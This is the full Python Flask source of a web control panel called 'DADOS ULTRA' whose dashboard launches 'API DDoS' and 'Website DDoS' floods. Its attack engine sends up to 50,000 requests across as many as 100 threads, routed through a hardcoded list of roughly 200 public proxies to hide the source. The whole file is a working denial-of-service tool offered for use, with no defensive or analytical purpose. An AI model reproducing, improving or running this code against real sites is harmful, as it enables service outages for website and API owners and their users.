from flask import Flask, request, jsonify, render_template_string
import requests
import threading
import time
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

# ============================================
# CONFIG
# ============================================
ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

# 🌍 ALL PROXIES
PROXY_LIST = [
    "94.158.244.245:1080","68.71.249.153:48606","193.25.215.182:22222","72.56.107.177:1080",
    "176.114.86.151:1080","43.161.217.219:1080","208.102.51.6:58208","162.253.68.97:4145",
    "167.71.32.51:1080","23.176.40.194:1080","173.212.239.43:1080","198.8.94.174:39078",
    "174.64.199.82:4145","68.71.241.33:4145","142.54.228.193:4145","88.204.142.108:1080",
    "104.200.152.30:4145","162.240.96.211:1080","72.205.0.93:4145","72.195.34.42:4145",
    "184.178.172.11:4145","98.191.0.37:4145","67.201.39.14:4145","103.75.118.84:1080",
    "184.181.217.210:4145","142.54.229.249:4145","199.102.104.70:4145","174.77.111.196:4145",
    "152.53.144.223:1080","184.178.172.28:15294","24.249.199.12:4145","152.70.57.143:1080",
    "72.195.34.58:4145","198.8.94.170:4145","66.42.224.229:41679","70.166.65.160:4145",
    "174.77.111.197:4145","104.37.135.145:4145","24.249.199.4:4145","15.235.58.227:1080",
    "192.252.216.81:4145","216.68.128.121:4145","104.200.135.46:4145","45.194.33.12:30001",
    "184.178.172.25:15291","184.181.217.206:4145","67.201.35.145:4145","98.170.57.231:4145",
    "72.195.34.59:4145","45.61.188.134:44499","98.188.47.132:4145","68.71.242.118:4145",
    "184.178.172.3:4145","199.229.254.129:4145","5.255.123.162:1080","69.61.200.104:36181",
    "184.170.249.65:4145","72.207.109.5:4145","152.32.230.12:7890","192.252.214.17:4145",
    "144.31.192.13:1080","98.182.171.161:4145","184.170.248.5:4145","121.169.46.116:1090",
    "199.102.106.94:4145","68.71.247.130:4145","72.223.188.92:4145","74.119.147.209:4145",
    "68.1.210.189:4145","5.255.117.250:1080","184.181.217.213:4145","23.175.248.21:1080",
    "8.210.54.203:1080","5.255.113.177:1080","103.231.12.249:1080","142.54.237.34:4145",
    "67.201.33.10:25283","192.111.137.35:4145","98.170.57.241:4145","74.119.144.60:4145",
    "192.252.220.89:4145","72.195.114.169:4145","134.122.64.174:1080","68.71.251.134:4145",
    "174.75.211.222:4145","194.233.68.54:1088","184.181.217.220:4145","192.111.130.2:4145",
    "72.195.34.41:4145","47.237.116.215:1080","142.54.237.38:4145","188.235.107.47:1080",
    "184.178.172.14:4145","149.62.186.244:1080","184.178.172.13:15311","198.8.84.3:4145",
    "174.75.211.193:4145","184.178.172.28:15294","98.175.31.222:4145","46.173.20.247:1080",
    "192.252.214.20:15864","47.79.79.35:10808","216.36.108.151:1080","192.252.214.17:4145",
    "184.178.172.18:15280","199.116.114.11:4145","199.102.105.242:4145","94.228.118.127:1414",
    "98.191.0.47:4145","184.178.172.26:4145","176.109.104.211:8888","199.116.112.6:4145",
    "138.124.61.124:1080","38.147.187.19:1100","142.54.232.6:4145","129.153.194.16:1080",
    "98.190.239.3:4145","72.195.34.41:4145","192.111.139.162:4145","47.237.120.182:1011",
    "192.252.209.158:4145","192.111.135.17:18302","45.194.33.12:30001","85.192.28.199:1081",
    "98.170.57.249:4145","192.111.137.37:18762","46.62.214.3:1080","98.175.31.195:4145",
    "98.178.72.21:10919","192.252.208.67:14287","124.221.130.67:1100","206.220.175.2:4145",
    "67.201.59.70:4145","142.54.226.214:4145","72.195.101.99:4145","185.210.85.26:56981",
    "222.90.211.34:1100","72.223.188.67:4145","77.110.119.136:1080","72.49.49.11:31034",
    "84.47.150.125:1080","45.76.188.171:1080","160.22.17.4:9988","199.102.107.145:4145",
    "142.54.239.1:4145","168.253.92.93:10808","184.178.172.23:4145","184.182.240.12:4145",
    "79.117.37.49:9050","192.252.208.70:14282","192.252.209.155:14455","98.178.72.30:4145",
    "161.97.118.197:1080","142.54.237.34:4145","192.252.210.233:4145","174.64.199.79:4145",
    "185.218.137.242:1080","142.54.235.9:4145","144.124.232.204:443","51.79.177.162:1010",
    "2.26.133.86:1080","192.111.134.10:4145","142.54.236.97:4145","158.180.77.24:1080",
    "5.255.99.75:1080","192.252.215.5:16137","68.71.240.210:4145","192.111.138.29:4145",
    "193.221.203.192:1080","43.106.21.170:1080","144.31.225.3:1080","162.253.68.97:4145",
    "199.58.185.9:4145","68.71.245.206:4145","5.255.103.55:1080","72.214.108.67:4145",
    "86.107.168.166:22","47.236.53.35:1145","82.114.228.67:1080","185.234.66.87:1082",
    "154.219.125.240:58367","203.25.208.163:1011","170.106.111.221:1080","162.240.96.211:8443",
    "130.61.119.46:3128","68.71.249.158:4145","165.154.227.13:1080","185.234.66.87:1081",
    "199.229.254.129:4145","47.83.168.191:4000","192.111.139.163:19404","192.252.211.193:4145",
    "213.165.38.234:1081","70.166.167.38:57728","72.49.49.11:31034","192.111.139.165:4145",
    "68.71.254.6:4145","192.111.129.145:16894","192.111.130.5:17002","72.37.216.68:4145",
    "72.207.113.97:4145","208.102.51.6:58208","67.201.58.190:4145","185.125.171.171:1080",
    "192.111.129.150:4145","107.181.161.81:4145","199.187.210.54:4145","107.152.98.5:4145",
    "170.64.170.204:1080","106.52.215.138:7890","212.58.132.5:1080","77.232.142.77:31336",
    "158.160.82.208:1080","159.54.148.142:1080","184.178.172.17:4145","184.170.245.148:4145",
    "192.252.216.86:4145","203.25.208.163:1111","213.121.165.12:1080","142.54.231.38:4145",
    "144.124.227.90:21074","185.125.201.149:7443",
]

active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}

# ============================================
# UI
# ============================================
LOGIN = """<!DOCTYPE html><html><head><title>DADOS ULTRA</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:monospace;overflow:hidden}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;background:radial-gradient(circle,#ff000010 1px,transparent 1px);background-size:50px 50px}
.box{background:#111;padding:40px;border-radius:20px;border:2px solid #ff0000;width:350px;text-align:center;box-shadow:0 0 50px #ff000066,0 0 100px #ff000033;animation:glow 2s infinite}
@keyframes glow{50%{box-shadow:0 0 80px #ff0000aa,0 0 150px #ff000066}}
h1{color:#ff0000;font-size:2em;text-shadow:0 0 30px #ff0000;margin-bottom:10px}
input{width:100%;padding:15px;background:#000;border:1px solid #ff0000;border-radius:10px;color:#ff0000;margin:10px 0;font-family:monospace;font-size:14px}
.btn{width:100%;padding:15px;background:linear-gradient(135deg,#ff0000,#cc0000);color:#fff;border:none;border-radius:10px;font-weight:bold;cursor:pointer;font-size:16px;margin-top:10px}
.btn:hover{box-shadow:0 0 40px #ff0000;transform:scale(1.02)}
.error{color:#ff0000;margin-top:10px;font-size:12px}
.snow{position:fixed;top:-10px;color:#ff0000;font-size:20px;animation:fall linear infinite;pointer-events:none;z-index:0}
@keyframes fall{to{transform:translateY(100vh) rotate(360deg)}}
</style></head><body>
<div class="box">
<h1>💀 DADOS ULTRA</h1>
<p style="color:#888;margin-bottom:20px">KILLER OSINT v2.0</p>
<form method="post">
<input type="text" name="user" placeholder="Username" required>
<input type="password" name="pass" placeholder="Password" required>
<button class="btn" type="submit">⚡ LOGIN</button>
</form>
{% if error %}<p class="error">{{ error }}</p>{% endif %}
</div>
<script>
for(let i=0;i<30;i++){let s=document.createElement('div');s.className='snow';s.innerHTML='❄️';s.style.left=Math.random()*100+'%';s.style.animationDuration=(Math.random()*5+5)+'s';s.style.animationDelay=Math.random()*5+'s';document.body.appendChild(s)}
</script></body></html>"""

DASH = """<!DOCTYPE html><html><head><title>DADOS ULTRA</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#ff0000;font-family:monospace;padding:15px;overflow-x:hidden}
.header{text-align:center;padding:25px;border:2px solid #ff0000;border-radius:15px;margin-bottom:20px;background:linear-gradient(135deg,#0a0000,#1a0000);box-shadow:0 0 50px #ff000066;animation:glow 3s infinite}
@keyframes glow{50%{box-shadow:0 0 100px #ff0000aa}}
h1{font-size:2.5em;text-shadow:0 0 30px #ff0000,0 0 60px #ff0000}
.card{background:#0a0a0a;border:1px solid #ff0000;border-radius:10px;padding:20px;margin:15px 0;box-shadow:0 0 20px #ff000022}
h3{color:#ff4444;margin-bottom:15px}
input,select{width:100%;padding:14px;background:#000;border:1px solid #ff0000;border-radius:8px;color:#ff0000;margin:8px 0;font-family:monospace;font-size:13px}
label{color:#888;font-size:11px;display:block;margin-top:8px}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#ff0000,#cc0000);color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;margin:8px 0;font-size:14px;transition:.3s}
.btn:hover{box-shadow:0 0 30px #ff0000;transform:scale(1.01)}
.btn-green{background:linear-gradient(135deg,#00cc44,#009933)}
.btn-stop{background:#333;color:#ff0000}
.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.col3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:15px}
.stat{background:#111;padding:15px;text-align:center;border-radius:10px;border:1px solid #ff0000}
.stat-val{font-size:2em;font-weight:bold}
.stat-label{font-size:10px;color:#888;margin-top:5px}
.s{color:#00ff00}.f{color:#ff0000}.t{color:#ff8800}
.logs{background:#000;padding:10px;border-radius:5px;max-height:250px;overflow:auto;font-size:10px;margin-top:10px;border:1px solid #333}
.log{padding:3px 0;border-bottom:1px solid #111}
.badge{padding:4px 10px;border-radius:20px;font-size:9px;display:inline-block;margin:2px}
.running{background:#ff000033;color:#ff0000;animation:pulse 1s infinite}
@keyframes pulse{50%{opacity:0.5}}
.snow{position:fixed;top:-10px;color:#ff0000;font-size:15px;animation:fall linear infinite;pointer-events:none;z-index:0;opacity:0.3}
@keyframes fall{to{transform:translateY(100vh) rotate(360deg)}}
</style></head><body>
<div class="header">
<h1>💀 DADOS ULTRA</h1>
<p style="color:#888">API DDoS | Website DDoS | {{ proxies }} Proxies | Multi-Thread</p>
</div>

<div class="col3">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">✅ SUCCESS</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">❌ FAILED</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">📊 TOTAL</div></div>
</div>

<div class="card">
<h3>🔥 API DDoS</h3>
<div class="row"><div><label>TARGET URL</label><input id="apiUrl" placeholder="https://api.target.com"></div><div><label>REQUESTS</label><input type="number" id="apiCount" value="1000"></div></div>
<label>SPEED</label>
<select id="apiSpeed"><option value="slow">🐢 Slow</option><option value="fast" selected>⚡ Fast</option><option value="veryfast">🔥 Very Fast</option><option value="ultra">💀 ULTRA</option></select>
<label>THREADS (Concurrent Proxies)</label>
<select id="apiThreads"><option value="5">5 Threads</option><option value="10" selected>10 Threads</option><option value="25">25 Threads</option><option value="50">50 Threads 💀</option></select>
<button class="btn" onclick="start('api')">🚀 LAUNCH</button><button class="btn btn-stop" onclick="stop('api')">⏹️ STOP</button>
<div id="apiStatus"></div>
</div>

<div class="card">
<h3>🌐 WEBSITE DDoS</h3>
<div class="row"><div><label>TARGET URL</label><input id="webUrl" placeholder="https://target.com"></div><div><label>REQUESTS</label><input type="number" id="webCount" value="5000"></div></div>
<label>SPEED</label>
<select id="webSpeed"><option value="slow">🐢 Slow</option><option value="fast" selected>⚡ Fast</option><option value="veryfast">🔥 Very Fast</option><option value="ultra">💀 ULTRA</option></select>
<label>THREADS</label>
<select id="webThreads"><option value="10">10</option><option value="25">25</option><option value="50" selected>50 💀</option><option value="100">100 ☠️</option></select>
<button class="btn" onclick="start('web')">🚀 LAUNCH</button><button class="btn btn-stop" onclick="stop('web')">⏹️ STOP</button>
<div id="webStatus"></div>
</div>

<div class="card">
<h3>📜 LIVE LOGS</h3>
<div class="logs" id="logs"></div>
</div>

<script>
let timers={};
function updateStats(){fetch('/stats').then(r=>r.json()).then(d=>{document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;document.getElementById('total').textContent=d.total})}
function loadLogs(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(l=>`<div class="log">${l}</div>`).join('')})}
function start(t){let u=document.getElementById(t+'Url').value;let c=document.getElementById(t+'Count').value;let s=document.getElementById(t+'Speed').value;let th=document.getElementById(t+'Threads').value;if(!u)return alert('Enter URL!');fetch('/attack/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:u,count:parseInt(c),speed:s,threads:parseInt(th)})}).then(r=>r.json()).then(d=>{document.getElementById(t+'Status').innerHTML=d.status==='started'?'<span class="badge running">⚡ ATTACKING</span>':'';loadLogs();updateStats()})}
function stop(t){fetch('/stop/'+t,{method:'POST'}).then(r=>r.json()).then(d=>{document.getElementById(t+'Status').innerHTML='<span style="color:#888">⏹️ Stopped</span>';loadLogs()})}
setInterval(()=>{loadLogs();updateStats()},1000);
for(let i=0;i<20;i++){let s=document.createElement('div');s.className='snow';s.innerHTML='❄️';s.style.left=Math.random()*100+'%';s.style.animationDuration=(Math.random()*8+5)+'s';document.body.appendChild(s)}
</script></body></html>"""

# ============================================
# ATTACK ENGINE
# ============================================
def send_req(url, proxy):
    try:
        p = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
        r = requests.get(url, proxies=p, timeout=5, headers={"User-Agent":"Mozilla/5.0"})
        return r.status_code == 200
    except:
        return False

def attack_thread(attack_id, url, count, speed, thread_id):
    speeds = {"slow": 0.5, "fast": 0.05, "veryfast": 0.01, "ultra": 0.001}
    delay = speeds.get(speed, 0.05)
    
    for i in range(count):
        if attack_id not in active_attacks:
            break
        
        proxy = random.choice(PROXY_LIST)
        success = send_req(url, proxy)
        
        if success:
            attack_stats["success"] += 1
        else:
            attack_stats["failed"] += 1
        attack_stats["total"] += 1
        
        attack_logs.append(f"[T{thread_id}] {'✅' if success else '❌'} {proxy} ({attack_stats['total']})")
        if len(attack_logs) > 200:
            attack_logs.pop(0)
        
        time.sleep(delay)

def run_multi_thread_attack(attack_id, url, count, speed, threads):
    per_thread = count // threads
    t_list = []
    
    for i in range(threads):
        t = threading.Thread(target=attack_thread, args=(attack_id, url, per_thread, speed, i+1))
        t.daemon = True
        t_list.append(t)
        t.start()
    
    for t in t_list:
        t.join()
    
    if attack_id in active_attacks:
        del active_attacks[attack_id]

# ============================================
# ROUTES
# ============================================
attack_logs = []

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user') == ADMIN_USER and request.form.get('pass') == ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN, error="❌ Invalid!")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true':
        return '<script>location.href="/"</script>'
    return render_template_string(DASH, proxies=len(PROXY_LIST))

@app.route('/attack/<atype>', methods=['POST'])
def attack(atype):
    if request.cookies.get('auth') != 'true':
        return jsonify({"error": "Unauthorized"}), 403
    
    d = request.get_json()
    url = d.get('url', '')
    count = min(d.get('count', 100), 50000)
    speed = d.get('speed', 'fast')
    threads = min(d.get('threads', 10), 100)
    
    if not url:
        return jsonify({"error": "URL required"}), 400
    
    aid = f"{atype}_{int(time.time())}"
    active_attacks[aid] = True
    attack_logs.append(f"🔥 START: {url} | {count} req | {threads} threads | {speed}")
    
    t = threading.Thread(target=run_multi_thread_attack, args=(aid, url, count, speed, threads))
    t.daemon = True
    t.start()
    
    return jsonify({"status": "started", "id": aid})

@app.route('/stop/<atype>', methods=['POST'])
def stop(atype):
    for k in list(active_attacks.keys()):
        if k.startswith(atype):
            del active_attacks[k]
    attack_logs.append(f"⏹️ {atype.upper()} STOPPED")
    return jsonify({"status": "stopped"})

@app.route('/logs')
def logs():
    return jsonify({"logs": [f"[{datetime.now().strftime('%H:%M:%S')}] {l}" if not l.startswith('[') else l for l in attack_logs[-30:]]})

@app.route('/stats')
def stats():
    return jsonify(attack_stats)

@app.route('/logout')
def logout():
    return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
